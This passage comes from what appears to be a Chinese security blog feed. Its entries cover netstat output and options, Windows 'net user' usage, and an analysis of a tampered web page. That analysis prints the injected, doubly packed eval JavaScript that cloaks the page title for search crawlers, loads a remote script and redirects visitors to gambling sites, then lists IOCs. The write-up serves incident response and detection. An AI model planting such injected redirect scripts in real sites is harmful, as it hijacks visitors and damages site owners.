connections established    387 segments received    284 segments sent out    2 segments retransmitted    0 bad segments received    18 resets sentUdp:    345 packets received    42 packets to unknown port received    0 packet receive errors    450 packets sent    0 receive buffer errors    0 send buffer errors    IgnoredMulti: 15UdpLite:TcpExt:    3 TCP sockets finished time wait in fast timer    6 delayed acks sent    185 packet headers predicted    28 acknowledgments not containing data payload received    27 predicted acknowledgments    TCPLostRetransmit: 1    TCPTimeouts: 2    2 connections reset due to early user close    TCPRcvCoalesce: 16    TCPAutoCorking: 6    TCPSynRetrans: 2    TCPOrigDataSent: 56    TCPDelivered: 70IpExt:    InMcastPkts: 76    OutMcastPkts: 77    InBcastPkts: 15    OutBcastPkts: 15    InOctets: 431065    OutOctets: 65974    InMcastOctets: 9435    OutMcastOctets: 9124    InBcastOctets: 1059    OutBcastOctets: 1059    InNoECTPkts: 830        parallels@parallels-Parallels-Virtual-Platform:~$ netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State      tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     tcp        0      0 localhost:ipp           0.0.0.0:*               LISTEN     tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN     udp        0      0 0.0.0.0:34725           0.0.0.0:*                          udp        0      0 localhost:domain        0.0.0.0:*                          udp        0      0 0.0.0.0:631             0.0.0.0:*                          udp        0      0 0.0.0.0:mdns            0.0.0.0:*                          udp6       0      0 [::]:54263              [::]:*                             udp6       0      0 [::]:mdns               [::]:*                             raw6       0      0 [::]:ipv6-icmp          [::]:*                  7          Active UNIX domain sockets (only servers)Proto RefCnt Flags       Type       State         I-Node   Pathunix  2      [ ACC ]     STREAM     LISTENING     40982    @/tmp/.ICE-unix/2258unix  2      [ ACC ]     STREAM     LISTENING     37764    /tmp/.X11-unix/X0unix  2      [ ACC ]     SEQPACKET  LISTENING     17436    /run/udev/controlunix  2      [ ACC ]     STREAM     LISTENING     40312    @/tmp/dbus-2137JWwNxOunix  2      [ ACC ]     STREAM     LISTENING     37405    /run/user/1000/systemd/privateunix  2      [ ACC ]     STREAM     LISTENING     37410    /run/user/1000/busunix  2      [ ACC ]     STREAM     LISTENING     37411    /run/user/1000/gnupg/S.dirmngrunix  2      [ ACC ]     STREAM     LISTENING     37412    /run/user/1000/gnupg/S.gpg-agent.browserunix  2      [ ACC ]     STREAM     LISTENING     37414    /run/user/1000/gnupg/S.gpg-agent.extraunix  2      [ ACC ]     STREAM     LISTENING     37417    /run/user/1000/gnupg/S.gpg-agent.sshunix  2      [ ACC ]     STREAM     LISTENING     37418    /run/user/1000/gnupg/S.gpg-agentunix  2      [ ACC ]     STREAM     LISTENING     37419    /run/user/1000/pk-debconf-socketunix  2      [ ACC ]     STREAM     LISTENING     37420    /run/user/1000/pulse/nativeunix  2      [ ACC ]     STREAM     LISTENING     37421    /run/user/1000/snapd-session-agent.socketunix  2      [ ACC ]     STREAM     LISTENING     38336    @/tmp/dbus-KNmuvSF3unix  2      [ ACC ]     STREAM     LISTENING     37763    @/tmp/.X11-unix/X0unix  2      [ ACC ]     STREAM     LISTENING     37499    /run/user/1000/keyring/controlunix  2      [ ACC ]     STREAM     LISTENING     17409    /run/systemd/privateunix  2      [ ACC ]     STREAM     LISTENING     17411    /run/systemd/userdb/io.systemd.DynamicUserunix  2      [ ACC ]     STREAM     LISTENING     40983    /tmp/.ICE-unix/2258unix  2      [ ACC ]     STREAM     LISTENING     40670    /run/user/1000/keyring/pkcs11unix  2      [ ACC ]     STREAM     LISTENING     17422    /run/systemd/fsck.progressunix  2      [ ACC ]     STREAM     LISTENING     41158    /run/user/1000/keyring/sshunix  2      [ ACC ]     STREAM     LISTENING     17432    /run/systemd/journal/stdoutunix  2      [ ACC ]     STREAM     LISTENING     27294    @/tmp/dbus-WiVk8ramunix  2      [ ACC ]     STREAM     LISTENING     17736    /run/systemd/journal/io.systemd.journalunix  2      [ ACC ]     STREAM     LISTENING     60034    @/dbus-vfs-daemon/socket-EGz2dAavunix  2      [ ACC ]     STREAM     LISTENING     38337    @/tmp/dbus-yLYVgUSdunix  2      [ ACC ]     STREAM     LISTENING     39169    /tmp/ssh-KbaAYvIXQiZa/agent.2103unix  2      [ ACC ]     STREAM     LISTENING     44273    @parallels-sga-socket@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@unix  2      [ ACC ]     STREAM     LISTENING     22541    /run/acpid.socketunix  2      [ ACC ]     STREAM     LISTENING     22543    /run/avahi-daemon/socketunix  2      [ ACC ]     STREAM     LISTENING     22545    /run/cups/cups.sockunix  2      [ ACC ]     STREAM     LISTENING     22547    /run/dbus/system_bus_socketunix  2      [ ACC ]     STREAM     LISTENING     22549    /run/snapd.socketunix  2      [ ACC ]     STREAM     LISTENING     22551    /run/snapd-snap.socketunix  2      [ ACC ]     STREAM     LISTENING     22554    /run/uuidd/requestunix  2      [ ACC ]     STREAM     LISTENING     22406    /run/irqbalance//irqbalance652.sockunix  2      [ ACC ]     STREAM     LISTENING     27293    @/tmp/dbus-Cpdg820dunix  2      [ ACC ]     STREAM     LISTENING     40135    @/home/parallels/.cache/ibus/dbus-SaqnFuHN</code></pre><h2 id="windows下异常端口-连接检查"><a href="#windows下异常端口-连接检查" class="headerlink" title="windows下异常端口/连接检查"></a>windows下异常端口/连接检查</h2><h3 id="netstat-1"><a href="#netstat-1" class="headerlink" title="netstat"></a>netstat</h3><p>官方 <a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/netstat">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/netstat</a></p><pre><code>显示协议统计信息和当前 TCP/IP 网络连接。NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-x] [-t] [interval]  -a            显示所有连接和侦听端口。  -b            显示在创建每个连接或侦听端口时涉及的                可执行程序。在某些情况下，已知可执行程序承载                多个独立的组件，这些情况下，                显示创建连接或侦听端口时                涉及的组件序列。在此情况下，可执行程序的                名称位于底部 [] 中，它调用的组件位于顶部，                直至达到 TCP/IP。注意，此选项                可能很耗时，并且在你没有足够                权限时可能失败。  -e            显示以太网统计信息。此选项可以与 -s 选项                结合使用。  -f            显示外部地址的完全限定                域名(FQDN)。  -n            以数字形式显示地址和端口号。  -o            显示拥有的与每个连接关联的进程 ID。  -p proto      显示 proto 指定的协议的连接；proto                可以是下列任何一个: TCP、UDP、TCPv6 或 UDPv6。如果与 -s                选项一起用来显示每个协议的统计信息，proto 可以是下列任何一个:                IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 或 UDPv6。  -q            显示所有连接、侦听端口和绑定的                非侦听 TCP 端口。绑定的非侦听端口                 不一定与活动连接相关联。  -r            显示路由表。  -s            显示每个协议的统计信息。默认情况下，                显示 IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 和 UDPv6 的统计信息;                -p 选项可用于指定默认的子网。  -t            显示当前连接卸载状态。  -x            显示 NetworkDirect 连接、侦听器和共享                终结点。  -y            显示所有连接的 TCP 连接模板。                无法与其他选项结合使用。  interval      重新显示选定的统计信息，各个显示间暂停的                间隔秒数。按 CTRL+C 停止重新显示                统计信息。如果省略，则 netstat 将打印当前的                配置信息一次。</code></pre><ul><li>Netstat 命令提供以下各项的统计信息：</li></ul><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>Proto</td><td>协议 (TCP 或 UDP) 的名称。</td></tr><tr><td>本地地址</td><td>本地计算机的 IP 地址和所使用的端口号。 除非指定了 <strong>-n</strong> 参数，否则显示与 IP 地址和端口名称对应的本地计算机的名称。 如果尚未建立端口，则端口号显示为星号 ( * ) 。</td></tr><tr><td>外部地址</td><td>套接字连接到的远程计算机的 IP 地址和端口号。 除非指定了 <strong>-n</strong> 参数，否则将显示与 IP 地址和端口对应的名称。 如果尚未建立端口，则端口号显示为星号 ( * ) 。</td></tr><tr><td>状态</td><td>指示 TCP 连接的状态，包括：CLOSE_WAITCLOSED端建立FIN_WAIT_1FIN_WAIT_2LAST_ACK侦听SYN_RECEIVEDSYN_SENDTIMED_WAIT</td></tr></tbody></table><h4 id="常用查询语句-1"><a href="#常用查询语句-1" class="headerlink" title="常用查询语句"></a>常用查询语句</h4><p>若要显示以太网统计信息和所有协议的统计信息，请键入：</p><pre><code>netstat -e -s</code></pre><p>若要仅显示 TCP 和 UDP 协议的统计信息，请键入：</p><pre><code>netstat -s -p tcp udp</code></pre><p>若要每隔5秒显示一次活动 TCP 连接和进程 Id，请键入：</p><pre><code>netstat -o 5</code></pre><p>若要使用数字形式显示活动 TCP 连接和进程 Id，请键入：</p><pre><code>netstat -n -o</code></pre><p>定位established链接:获取正在链接的IP地址和进程信息</p><pre><code>netstat -ano | findstr “ESTABLISHED”netstat -ano | findstr “LISTENING”</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Linux下异常端口-连接检查&quot;&gt;&lt;a href=&quot;#Linux下异常端口-连接检查&quot; class=&quot;headerlink&quot; title=&quot;Linux下异常端口/连接检查&quot;&gt;&lt;/a&gt;Linux下异常端口/连接检查&lt;/h2&gt;&lt;h3 id=&quot;netstat&quot;&gt;&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/05/25/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E4%B8%A4%E6%AC%A1js%E5%8A%A0%E5%AF%86%E6%A1%88%E4%BE%8B/"/>
    <id>https://xtpeeps.cn/2021/05/25/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E4%B8%A4%E6%AC%A1js%E5%8A%A0%E5%AF%86%E6%A1%88%E4%BE%8B/</id>
    <published>2021-05-25T09:50:20.044Z</published>
    <updated>2021-06-01T04:42:52.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="两次js加密案例"><a href="#两次js加密案例" class="headerlink" title="两次js加密案例"></a>两次js加密案例</h2><p>本次案例在日常工作中发现，2次的js加密案例，分享分析过程。</p><img src="/2021/05/25/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E4%B8%A4%E6%AC%A1js%E5%8A%A0%E5%AF%86%E6%A1%88%E4%BE%8B/image-20210601124004491.png" class="" title="image-20210601124004491"><h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><p>在访问页面的时候baidu UA导致跳转，源码如下：</p><pre><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;&lt;title&gt;&amp;#22836;&amp;#22836;&amp;#124;&amp;#20307;&amp;#32946;&amp;#45;&amp;#23448;&amp;#32593;&lt;/title&gt;&lt;meta name=&quot;keywords&quot; content=&quot;&amp;#22836;&amp;#22836;&amp;#124;&amp;#20307;&amp;#32946;&amp;#45;&amp;#23448;&amp;#32593;&quot;/&gt;&lt;meta name=&quot;description&quot; content=&quot;&amp;#22836;&amp;#22836;&amp;#124;&amp;#20307;&amp;#32946;&amp;#45;&amp;#23448;&amp;#32593;&amp;#12304;&amp;#23448;&amp;#32593;&amp;#65306;&amp;#97;&amp;#121;&amp;#120;&amp;#98;&amp;#101;&amp;#116;&amp;#57;&amp;#56;&amp;#55;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#12305;&amp;#25552;&amp;#20379;&quot;/&gt;&lt;script&gt;if(navigator.userAgent.toLocaleLowerCase().indexOf(&quot;baidu&quot;) == -1)&#123;document.title =&quot;正常页面的title值xxxx&quot;&#125;&lt;/script&gt;......&lt;script type=&quot;text/javascript&quot;&gt;eval(function(p,a,c,k,e,r)&#123;e=function(c)&#123;return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return&#39;\\w+&#39;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p&#125;(&#39;m(d(p,a,c,k,e,r)&#123;e=d(c)&#123;f c.n(a)&#125;;h(!\&#39;\&#39;.i(/^/,o))&#123;j(c--)r[e(c)]=k[c]||e(c);k=[d(e)&#123;f r[e]&#125;];e=d()&#123;f\&#39;\\\\w+\&#39;&#125;;c=1&#125;;j(c--)h(k[c])p=p.i(q s(\&#39;\\\\b\&#39;+e(c)+\&#39;\\\\b\&#39;,\&#39;g\&#39;),k[c]);f p&#125;(\&#39;1[&quot;2&quot;][&quot;3&quot;](\\\&#39;&lt;0 4=&quot;5/6&quot; 7=&quot;8://9.a/b.c&quot;&gt;&lt;/0&gt;\\\&#39;);\&#39;,l,l,\&#39;t|u|v|x|y|z|A|B|C|D|E|F|G\&#39;.H(\&#39;|\&#39;),0,&#123;&#125;))&#39;,44,44,&#39;|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|lelele2|com|cp|js|split&#39;.split(&#39;|&#39;),0,&#123;&#125;))&lt;/script&gt;</code></pre><p>首先页面title被篡改，如果是非baidu UA则会展示正常页面的title值，如果是baidu UA则会使用被篡改的title展示，如百度搜索等。</p><pre><code>eval(function(p,a,c,k,e,r)&#123;e=function(c)&#123;return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return&#39;\\w+&#39;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p&#125;(&#39;m(d(p,a,c,k,e,r)&#123;e=d(c)&#123;f c.n(a)&#125;;h(!\&#39;\&#39;.i(/^/,o))&#123;j(c--)r[e(c)]=k[c]||e(c);k=[d(e)&#123;f r[e]&#125;];e=d()&#123;f\&#39;\\\\w+\&#39;&#125;;c=1&#125;;j(c--)h(k[c])p=p.i(q s(\&#39;\\\\b\&#39;+e(c)+\&#39;\\\\b\&#39;,\&#39;g\&#39;),k[c]);f p&#125;(\&#39;1[&quot;2&quot;][&quot;3&quot;](\\\&#39;&lt;0 4=&quot;5/6&quot; 7=&quot;8://9.a/b.c&quot;&gt;&lt;/0&gt;\\\&#39;);\&#39;,l,l,\&#39;t|u|v|x|y|z|A|B|C|D|E|F|G\&#39;.H(\&#39;|\&#39;),0,&#123;&#125;))&#39;,44,44,&#39;|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|lelele2|com|cp|js|split&#39;.split(&#39;|&#39;),0,&#123;&#125;))</code></pre><p>eval内容为主要跳转内容，通常这种形式考虑js加密，但此内容发现一层嵌套格式，而且js解完如下，仍然为js加密形式：</p><pre><code>eval(function(p,a,c,k,e,r)&#123;e=function(c)&#123;return c.toString(a)&#125;;if(!&#39;&#39;.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return&#39;\\w+&#39;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p&#125;(&#39;1[&quot;2&quot;][&quot;3&quot;](\&#39;&lt;0 4=&quot;5/6&quot; 7=&quot;8://9.a/b.c&quot;&gt;&lt;/0&gt;\&#39;);&#39;,13,13,&#39;script|window|document|write|type|text|javascript|src|https|lelele2|com|cp|js&#39;.split(&#39;|&#39;),0,&#123;&#125;))</code></pre><p>再次进行解密最终显示出其跳转：</p><pre><code>window[&quot;document&quot;][&quot;write&quot;](&#39;&lt;script type=&quot;text/javascript&quot; src=&quot;https[://]lelele2[.]com[/]cp[.]js&quot;&gt;&lt;/script&gt;&#39;);</code></pre><p>通过跟踪脚本内容可以看到，该样本先将统计信息发送到360，百度。之后通过在原页面中写入跳转脚本，实现跳转</p><pre><code>var _hmt = _hmt || [];(function() &#123;  var hm = document.createElement(&quot;script&quot;);  hm.src = &quot;https://hm.baidu.com/hm.js?2a49ee9e85a5fb54cf65d27a54cf81b6&quot;;  var s = document.getElementsByTagName(&quot;script&quot;)[0];   s.parentNode.insertBefore(hm, s);&#125;)();(function () &#123;    /*百度推送代码*/     var bp = document.createElement(&#39;script&#39;);     bp.src = &#39;//push.zhanzhang.baidu.com/push.js&#39;;     var s = document.getElementsByTagName(&quot;script&quot;)[0];     s.parentNode.insertBefore(bp, s);     /*360推送代码*/     var src = document.location.protocol + &#39;//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9&#39;;     document.write(&#39;&lt;script src=&quot;&#39; + src + &#39;&quot; id=&quot;sozz&quot;&gt;&lt;\/script&gt;&#39;);     &#125;)();document.writeln(&quot;&lt;script LANGUAGE=\&quot;Javascript\&quot;&gt;&quot;);document.writeln(&quot;var s=document.referrer&quot;);document.writeln(&quot;if(s.indexOf(\&quot;baidu\&quot;)&gt;0 || s.indexOf(\&quot;sogou\&quot;)&gt;0 || s.indexOf(\&quot;soso\&quot;)&gt;0 ||s.indexOf(\&quot;sm\&quot;)&gt;0 ||s.indexOf(\&quot;uc\&quot;)&gt;0 ||s.indexOf(\&quot;bing\&quot;)&gt;0 ||s.indexOf(\&quot;yahoo\&quot;)&gt;0 ||s.indexOf(\&quot;so\&quot;)&gt;0 )&quot;);document.writeln(&quot;location.href=\&quot;https[://]2021531[.]com\&quot;;&quot;);document.writeln(&quot;&lt;/script&gt;&quot;);</code></pre><p>10s跳转页面，加载http[]://]lelele1[/]yb.js （无效）脚本（此内容根据推断应该为http[]://]lelele1[.]com[/]yb.js此脚本同上面一个脚本，实际上可以确保如果一个没有跳转，功能相同可能这里被改成了无效）</p><pre><code>&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;爱游戏官网 &lt;/title&gt;...&lt;script src=&quot;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#108;&amp;#101;&amp;#108;&amp;#101;&amp;#108;&amp;#101;&amp;#49;&amp;#47;&amp;#121;&amp;#98;&amp;#46;&amp;#106;&amp;#115;&quot;&gt;&lt;/script&gt;  &lt;script&gt;          setTimeout(function()&#123;           var arr=[&#39;https[://]ayxvip8855[.]com&#39;,];          window.location.href=arr[parseInt(Math.random()*arr.length)];          &#125;,10);     &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h1&gt;爱游戏官网 马上进入.....&lt;/h1&gt;        &lt;h3&gt;正在为您匹配最佳线路.....&lt;/h3&gt;        &lt;ul&gt;          &lt;li&gt;本站使用：当您访问本站的时候出现不能正常访问，请刷新网站或从新打开访问，系统自动为您匹配最佳访问网址&lt;/li&gt;      &lt;li&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt;var cnzz_protocol = ((&quot;https:&quot; == document.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;);document.write(unescape(&quot;%3Cspan id=&#39;cnzz_stat_icon_1278159129&#39;%3E%3C/span%3E%3Cscript src=&#39;&quot; + cnzz_protocol + &quot;s9.cnzz.com/z_stat.php%3Fid%3D1278159129%26show%3Dpic&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));&lt;/script&gt;&lt;/html&gt;</code></pre><h5 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h5><p>https[:]//lelele2[.]com[/]cp.js<br>2021531[.]com<br>ayxvip8855[.]com<br><a href="http://lelele1.com[/]yb[.]js">http://lelele1.com[/]yb[.]js</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;两次js加密案例&quot;&gt;&lt;a href=&quot;#两次js加密案例&quot; class=&quot;headerlink&quot; title=&quot;两次js加密案例&quot;&gt;&lt;/a&gt;两次js加密案例&lt;/h2&gt;&lt;p&gt;本次案例在日常工作中发现，2次的js加密案例，分享分析过程。&lt;/p&gt;
&lt;img src=&quot;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>系统用户审查</title>
    <link href="https://xtpeeps.cn/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/"/>
    <id>https://xtpeeps.cn/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/</id>
    <published>2021-05-17T17:46:25.000Z</published>
    <updated>2021-05-17T17:58:17.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows查看用户"><a href="#windows查看用户" class="headerlink" title="windows查看用户"></a>windows查看用户</h2><h3 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h3><p>查看当前用户</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620571913692-e229787b-c4f1-472d-b3e0-8216c0fa7e17.png" class="" title="image.png"><h3 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h3><h4 id="命令释义"><a href="#命令释义" class="headerlink" title="命令释义"></a>命令释义</h4><p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865">查阅官网文档</a></p><pre><code>net user [&lt;UserName&gt; &#123;&lt;Password&gt; | *&#125; [&lt;Options&gt;]] [/domain]net user [&lt;UserName&gt; &#123;&lt;Password&gt; | *&#125; /add [&lt;Options&gt;] [/domain]]net user [&lt;UserName&gt; [/delete] [/domain]]</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;UserName&gt;</code></td><td>指定用户账户名字用于添加/删除/修改/查看。账户名称最多20字符。</td></tr><tr><td><code>&lt;Password&gt;</code></td><td>分配/修改用户账户密码。password参数输入*，会产生一个前端的提示，“请输入密码 ： ”，这时输入的密码均不会出现原文，密码输入均以不可见方式输入，并且系统会要求两次输入确保输入无误。</td></tr><tr><td><code>/domain</code></td><td>在计算机的主域的域控制器上执行操作。</td></tr><tr><td><code>&lt;Options&gt; </code></td><td>指定命令行选项。关于命令行选项语法的描述请参见下表。</td></tr><tr><td><code>net help &lt;Command&gt;</code></td><td>显示指定net命令的帮助。</td></tr></tbody></table><table><thead><tr><th><strong>命令行选项语法</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>/active: {no | yes}</td><td>启用或禁用用户帐户。如果该用户帐户未激活，则该用户无法访问计算机上的资源。默认为yes(即活动)。</td></tr><tr><td><code>/comment: &quot;&lt;Text&gt;&quot;  </code></td><td>提供关于用户帐户的描述性注释。这个注释最多可以有48个字符。将文本用引号括起来。</td></tr><tr><td>/countrycode: <code>&lt;NNN&gt; </code></td><td>使用操作系统国家/地区代码实现用户帮助和错误消息的指定语言文件。0表示默认的国家/地区代码。</td></tr><tr><td><code>/expires: &#123;&#123;&lt;MM/DD/YYYY&gt; | &lt;DD/MM/YYYY&gt; | &lt;mmm,dd,YYYY&gt;&#125; | never&#125; </code></td><td>如果指定日期，则导致用户帐户过期。根据国家/地区代码的不同，过期日期的格式可以是[MM/DD/YYYY]、[DD/MM/YYYY]或[mmm, DD,YYYY]。请注意，帐户将在指定日期开始时过期。对于月份值，您可以使用数字，拼写出来，或者使用三个字母的缩写(即，Jan, Feb, Mar, Apr, May, Jun, Jul, Aug, Sep, Oct, Nov, Dec)。可以使用两个或四个数字作为年份值。使用逗号或斜杠来分隔日期。不要使用空格。如果忽略<code>&lt;YYYY&gt;</code>，则假定该日期(即，根据您计算机的日期和时间)的下一个出现。例如，以下条目在1994年1月10日和1995年1月8日之间输入是等价的: jan,91/9/95january,9,19951/9</td></tr><tr><td>/fullname: “<code>&lt;Name&gt;</code>“</td><td>指定用户的全名而不是用户名。将名称用引号括起来。</td></tr><tr><td>/homedir: <code>&lt;Path&gt;</code></td><td>设置用户的主目录的路径。该路径必须已经存在。</td></tr><tr><td>/passwordchg: {yes | no}</td><td>指定用户是否可以修改自己的密码。默认为yes。</td></tr><tr><td>/passwordreq: {yes | no}</td><td>指定用户帐户是否必须有密码。默认为yes。</td></tr><tr><td>/profilepath: [<code>&lt;Path&gt;</code>]</td><td>设置用户登录配置文件的路径。这个路径指向一个注册表配置文件。</td></tr><tr><td>/scriptpath: <code>&lt;Path&gt;  </code></td><td>设置用户登录脚本的路径。&lt;路径&gt;不能是绝对路径。<code>&lt;Path&gt;</code>相对于%systemroot%\System32\Repl\Import\Scripts。</td></tr><tr><td><code>/times: &#123;&lt;Day&gt;[&lt;-Day&gt;][,&lt;Day&gt;[-&lt;Day&gt;]],&lt;Time&gt;[-&lt;Time&gt;][,&lt;Time&gt;[-&lt;Time&gt;]][;] | all&#125;</code></td><td>指定允许用户使用计算机的次数。&lt; &gt;时间限制为1小时递增。对于<code>&lt;Day&gt;</code>值，您可以拼写出日期的名称或使用缩写(即M、T、W、Th、F、Sa、Su)。您可以使用12小时或24小时表示法表示小时。如果您使用12小时表示法，请使用AM和PM，或A.M.和P.M.值all表示用户始终可以登录。空值(空白)意味着用户永远不能登录。用逗号分隔日和时间，用分号分隔日和时间的单位(例如，M,4AM-5PM;T,1PM-3PM)。在指定的时间不要使用空格。</td></tr><tr><td><code>/usercomment: &quot;&lt;Text&gt;&quot;  </code></td><td>指定管理员可以为该帐户添加或更改“用户评论”。将文本用引号括起来。</td></tr><tr><td><code>/workstations: &#123;&lt;ComputerName&gt;[,...] | *&#125; </code></td><td>列出用户可以从其中登录到网络的至多8个工作站。列表中的多个条目用逗号分隔。如果/工作站没有列表或列表是星号(*)，则用户可以从任何计算机登录。</td></tr></tbody></table><h4 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h4><pre><code>以下示例显示本地计算机的所有用户帐户列表: net user显示用户账号tommyh的信息，示例如下: net user tommyh下面的示例为一个用户添加了一个用户帐户，该用户的全名是Jay Jamison，用户名是jayj，拥有从周一到周五上午8点到下午5点的登录权限(时间指定中没有空格)，一个强制密码(Cyk4^g3B)和用户的全名: net user jayj Cyk4^g3B /add /passwordreq: yes /times: monday-friday,8am-5pm /fullname: &quot;Jay Jamison&quot;下面的示例使用24小时表示法设置miked的登录时间(8 A.M.到5 P.M.): net user miked /time: M-F,08: 00-17: 00下面的示例使用12小时表示法设置miked的登录时间(8 A.M.到5 P.M.): net user miked /time: M-F,8AM-5PM以下示例指定的登录时间为: 星期一早上4点到下午5点，星期二下午1点到下午3点，星期三到星期五上午8点到下午5点。net user anibals /time: M,4AM-5PM;T,1PM-3PM;W-F,8: 00-17: 00</code></pre><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1619875940125-d62fb938-2a64-4c22-b46e-84f499d8b025.png" class="" title="image.png"><img 